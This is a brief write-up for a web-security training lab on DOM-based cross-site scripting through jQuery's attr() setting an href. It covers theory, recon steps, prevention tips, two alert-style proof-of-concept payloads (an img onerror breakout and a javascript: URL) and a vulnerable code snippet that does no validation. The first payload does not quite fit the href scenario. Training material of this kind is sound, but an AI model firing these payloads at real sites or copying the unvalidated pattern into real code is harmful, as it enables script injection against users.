# DOM XSS via jQuery href

## Lab Link
https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute

## Vulnerability Type
DOM-based XSS

## Difficulty
Easy

## Vulnerability Theory
jQuery $.attr() method can be abused to set dangerous attributes:
- Setting `href` to `javascript:` URLs
- Setting `onclick` or other event handlers
- Not sanitizing user input before using in jQuery methods

## Recon & Discovery
1. Identify jQuery usage in page
2. Look for parameters reflected in jQuery method calls
3. Check for $.html(), $.attr(), $.append() usage
4. Test with `javascript:` URLs

## Step-by-Step Exploitation

### Request with XSS payload:
```
GET /search?query="></script><img src=x onerror="alert(1)" HTTP/1.1
```

Or with href:
```
GET /redirect?url=javascript:alert('XSS') HTTP/1.1
```

### jQuery vulnerable code:
```javascript
var url = getParameter('url');
$('#link').attr('href', url); // No validation!
```

## Prevention
1. Validate URLs (whitelist safe protocols)
2. Use safe jQuery methods
3. Sanitize all user input

---

**Difficulty**: Easy
**Time**: 5-10 minutes
